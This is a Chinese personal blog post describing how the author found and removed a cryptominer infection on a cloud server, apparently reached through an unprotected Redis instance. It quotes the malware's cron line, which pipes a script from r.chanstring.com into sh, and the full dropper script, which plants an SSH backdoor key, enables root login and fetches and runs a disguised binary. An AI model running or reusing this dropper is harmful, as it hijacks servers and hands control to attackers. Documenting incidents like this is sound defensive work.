@@ -1,0 +1,129 @@
+---
+author: huji
+comments: true
+date: 2016-10-13 15:07:20+00:00
+layout: post
+slug: 我的阿里云被人黑了...
+title: 我的阿里云被人黑了...
+categories:
+- coding
+---
+
+这件事情整个过程还是挺有意思的，记录一下事情经过.
+
+
+
+* 阿里云的邮件
+
+首先是10.12晚上，我收到一封阿里云的邮件：
+
+``` 
+	经检测您的云服务器（123.56.46.78）存在恶意发包行为，需要您尽快排查您的安全隐患。
+	目前系统不会处罚您的机器，但请您务必重视。
+```
+
+当天晚上我真心没重视，第二天也就是今天早上又收到一条短信再次提醒了我一次，我才想起这个事情，突然想起前几天自己倒腾redis的时候，貌似没有设置redis密码，有可能是这个导致的（后来搜索的时候发现确实有人是因为这个中招的，redis有一个什么漏洞会让别人通过连上redis server获取root权限）。
+
+
+
+* top
+
+ssh上去，首先就把redis server停了，然后在这过程中就感觉搞什么操作都卡卡的，于是我就top了一下，发现有个叫minerd的进程cpu占了97%左右，内存倒是没占什么，到网上搜了一下，发现是用来挖比特币的，心里倒是放心了，黑进来的人没干什么特别坏的事情。
+
+
+
+好奇这个事情什么时候开始的，于是登陆到阿里云控制台看了下cpu使用记录，发现从10.10 11:00左右开始，cpu使用量上来的:
+
+![aliyun](/images/aliyun_cpu.png)
+
+
+
+kill minerd进程，感觉应该不会这么简单，于是等了一会看，果然又起来了。于是到根目录find了一下，发现有两个叫minerd的文件.
+
+![file](/images/minerd_file.png)
+
+删掉这个文件，果然过一会又出现了。网上有人用chmod把minred的执行权限先删掉了，可以暂时屏蔽掉这个问题，但这肯定没解决问题啊！暂时没什么思路，但是先按那个办法把minerd的执行权限干掉了，不然真的很卡.......虽然知道肯定是某个运行着的进程干的这个事情，但那么多进程，怎么知道是哪一个，人家肯定不会命名叫hack_process吧.
+
+
+
+* crontab
+
+一开始没想起来crontab这么个东西，直接到/var/log/messages里面看系统日志，发现从10.10的11点左右就开始不断有一个错误日志：
+
+``` 
+111 Oct 10 10:53:36 iZ25svomv4kZ crond: sendmail: fatal: parameter inet_interfaces: no local interface found for ::1
+```
+
+才想起来有可能是hacker利用crontab在干什么坏事.`crontabl -l`看了一下，果然有一条定时任务，但看起来和minerd那个程序没啥关系，它是这样的：
+
+``` 
+*/10 * * * * curl -fsSL http://r.chanstring.com/pm.sh?0706 | sh
+```
+
+把那个sh脚本下载下来，是这样滴：
+
+``` 
+export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin
+
+echo "*/10 * * * * curl -fsSL http://r.chanstring.com/pm.sh?0706 | sh" > /var/spool/cron/root
+mkdir -p /var/spool/cron/crontabs
+echo "*/10 * * * * curl -fsSL http://r.chanstring.com/pm.sh?0706 | sh" > /var/spool/cron/crontabs/root
+
+if [ ! -f "/root/.ssh/KHK75NEOiq" ]; then
+	mkdir -p ~/.ssh
+	rm -f ~/.ssh/authorized_keys*
+	echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzwg/9uDOWKwwr1zHxb3mtN++94RNITshREwOc9hZfS/F/yW8KgHYTKvIAk/Ag1xBkBCbdHXWb/TdRzmzf6P+d+OhV4u9nyOYpLJ53mzb1JpQVj+wZ7yEOWW/QPJEoXLKn40y5hflu/XRe4dybhQV8q/z/sDCVHT5FIFN+tKez3txL6NQHTz405PD3GLWFsJ1A/Kv9RojF6wL4l3WCRDXu+dm8gSpjTuuXXU74iSeYjc4b0H1BWdQbBXmVqZlXzzr6K9AZpOM+ULHzdzqrA3SX1y993qHNytbEgN+9IZCWlHOnlEPxBro4mXQkTVdQkWo0L4aR7xBlAdY7vRnrvFav root" > ~/.ssh/KHK75NEOiq
+	echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
+	echo "RSAAuthentication yes" >> /etc/ssh/sshd_config
+	echo "PubkeyAuthentication yes" >> /etc/ssh/sshd_config
+	echo "AuthorizedKeysFile .ssh/KHK75NEOiq" >> /etc/ssh/sshd_config
+	/etc/init.d/sshd restart
+fi
+
+if [ ! -f "/etc/init.d/ntp" ]; then
+	if [ ! -f "/etc/systemd/system/ntp.service" ]; then
+		mkdir -p /opt
+		curl -fsSL http://r.chanstring.com/v51/lady_`uname -m` -o /opt/KHK75NEOiq33 && chmod +x /opt/KHK75NEOiq33 && /opt/KHK75NEOiq33 -Install
+	fi
+fi
+
+/etc/init.d/ntp start
+
+ps auxf|grep -v grep|grep "/usr/bin/cron"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "/opt/cron"|awk '{print $2}'|xargs kill -9
+
+```
+
+于是一行一行把脚本读了，把对应的被修改的地方都改回来，把下载的文件全删掉，只有那个ntp，把我迷惑了，以为是真正的那个ntp呢.....心里还想，挖矿可能需要校准时间吧.
+
+
+
+然而还是根本停不下来，还是会重新下载minerd并启动，我开始怀疑是因为之前运行的某个进程在内存驻留着，我把你的文件都删了，再重启服务器，应该就没了吧，遂重启。发现被删的文件都回来了，甚至还在之前被我删掉的.ssh目录里面又加了一条免密码登陆的sshkey.....
+
+
+
+* audit
+
+得换个思路，我把minerd的执行权限干了，并且把他的进程kill掉了，这时候那个后台进程应该隔一段时间就会去启动一次minerd才对，但权限错误，应该会留下些信息吧，想起来好多年前以前看鸟哥的linux私房菜的时候，逛论坛看到过有个东东是可以看到所有文件访问记录的，搜了一下找到了audit.，按照man的指示用了下，监控minerd的访问记录，看到下面的log:
+
+``` 
+type=SYSCALL msg=audit(1476361497.445:16): arch=c000003e syscall=59 success=no 
+exit=-13 a0=c820361d90 a1=c8201b89c0 a2=c82018b530 a3=0 items=1 ppid=424 
+pid=2100 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 
+fsgid=0 tty=(none) ses=4294967295 comm="ntp" exe="/usr/sbin/ntp" key="hack"
+
+type=CWD msg=audit(1476361497.445:16):  cwd="/"
+
+type=PATH msg=audit(1476361497.445:16): item=0 name="/opt/minerd" 
+inode=1183923 dev=ca:01 mode=0100644 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+```
+
+干，果然是之前脚本里面出现那个ntp，然后顺着把ntp和一个叫ntp.service的东西删了，看了下两个文件的时间，还果然对得上：
+
+![npt_file](/images/npt_time.png)
+
+接着再过了一遍那个pm.sh脚本，把相关文件全部删掉，相关进程全部kill，重启服务器，世界清净了....
+
+
+
+等等，根源还没有治，搜了下redis安全相关的文章看了下，把之前得安全隐患全部都干掉。收工，然后写了这篇文章。
